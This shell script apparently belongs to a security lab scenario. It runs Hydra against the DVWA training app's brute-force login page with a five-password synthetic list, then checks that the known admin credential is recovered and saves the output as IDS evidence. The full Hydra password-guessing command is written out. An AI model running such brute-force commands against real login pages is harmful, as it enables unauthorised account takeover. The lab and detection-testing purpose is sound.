#!/bin/sh
# Replay the five-password DVWA lab list through Hydra, inside this lab only.
set -eu
. /opt/scenarios/lib.sh

new_run hydra
login_as_admin_low

cookie_file="$RUN_DIR/cookies.txt"
php_session="$(awk '$6 == "PHPSESSID" { print $7; exit }' "$cookie_file")"
security_level="$(awk '$6 == "security" { print $7; exit }' "$cookie_file")"

if [ -z "$php_session" ] || [ -z "$security_level" ]; then
    echo 'DVWA session cookies are unavailable for the authorised Hydra replay.' >&2
    exit 1
fi

# Hydra does not ignore comments in a password file.  Keep the replay limited
# to the five synthetic passwords and retain the effective list as evidence.
password_file="$RUN_DIR/passwords.txt"
grep -v '^[[:space:]]*\(#\|$\)' /opt/scenarios/passwords-lab.txt > "$password_file"

if [ "$(wc -l < "$password_file" | tr -d ' ')" -ne 5 ]; then
    echo 'The Hydra lab password list must contain exactly five candidates.' >&2
    exit 1
fi

target_ip="${DVWA_URL#http://}"
target_ip="${target_ip%%/*}"
cookie_header="security=${security_level}; PHPSESSID=${php_session}"

# Use one connection at a time so the IDS threshold and captured evidence are
# deterministic.  The failure string is specific to DVWA's Brute Force page.
if ! hydra -l admin -P "$password_file" -s 80 -t 1 -f -V \
    -o "$RUN_DIR/hydra-results.txt" "$target_ip" http-get-form \
    "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\\: $cookie_header:F=Username and/or password incorrect." \
    > "$RUN_DIR/hydra-output.txt" 2>&1; then
    cat "$RUN_DIR/hydra-output.txt" >&2
    exit 1
fi

if ! grep -q 'login: admin.*password: password' "$RUN_DIR/hydra-results.txt"; then
    cat "$RUN_DIR/hydra-output.txt" >&2
    echo 'Hydra did not recover the expected synthetic DVWA credential.' >&2
    exit 1
fi

printf '%s\n' 'Hydra replay recovered the synthetic DVWA credential. Evidence: '"$RUN_DIR"
